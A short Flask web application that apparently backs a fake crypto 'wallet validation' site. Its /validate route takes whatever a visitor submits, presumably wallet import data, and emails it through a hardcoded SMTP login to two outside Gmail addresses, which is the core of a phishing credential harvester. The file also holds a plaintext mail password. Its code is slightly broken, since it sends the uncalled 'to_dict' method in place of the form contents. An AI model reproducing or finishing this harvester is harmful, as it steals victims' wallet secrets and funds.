from flask import Flask, render_template, request, url_for
import smtplib 
app = Flask(__name__)
def sendMail(mess):

    gmail_user = "info@unitedbconsesusnode.com"
    gmail_password = "Myking08"

    sent_from = gmail_user
    to = ['mrjohn.soft@gmail.com',"foodhubnig@gmail.com"]
    subject = 'Lorem ipsum dolor sit amet'
    body = mess

    email_text = """\
    From: %s
    To: %s
    Subject: %s

    %s
    """ % (sent_from, ", ".join(to), subject, body)

    try:
        smtp_server = smtplib.SMTP_SSL('mail.privateemail.com', 465)
        smtp_server.ehlo()
        smtp_server.login(gmail_user, gmail_password)
        smtp_server.sendmail(sent_from, to, email_text)
        smtp_server.close()
        print ("Email sent successfully!")
    except Exception as ex:
        print ("Something went wrong….",ex)




@app.route("/")
def home():
    return render_template("DappsTools.html")

@app.route("/validate", methods=["GET", "POST"])
def dapp():
    if request.method == "POST":
        print(request.form.to_dict)
        sendMail(request.form.to_dict)
        return render_template("import.html")
    return render_template("WalletsValidation.html")

@app.route('/import')
def importWall():
    return render_template("import.html")
if __name__ == "__main__":
    app.run(debug=True)